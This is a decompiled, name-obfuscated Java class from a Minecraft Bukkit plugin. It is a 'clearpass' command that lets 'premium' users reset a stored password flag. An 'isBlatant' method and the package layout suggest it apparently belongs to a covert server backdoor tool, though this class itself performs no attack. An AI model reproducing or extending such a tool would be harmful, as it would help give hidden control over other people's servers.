/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class ClearpassCommand
extends Command {
    public ClearpassCommand() {
        ClearpassCommand llIIlIllllIllll;
    }

    @Override
    public void execute(Core llIIlIllllIlIll, String llIIlIllllIlIlI, String[] llIIlIllllIlIIl, Player llIIlIllllIIllI) {
        if (llIIlIllllIlIll.premium.contains(llIIlIllllIIllI.getName())) {
            if (DataManager.getData().getBoolean("hasPass")) {
                DataManager.getData().set("hasPass", (Object)false);
                DataManager.saveData();
                llIIlIllllIIllI.sendMessage(Settings.PREFIX("The password has been cleared!"));
            } else {
                llIIlIllllIIllI.sendMessage(Settings.PREFIX("There is no password set!"));
            }
        } else {
            llIIlIllllIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

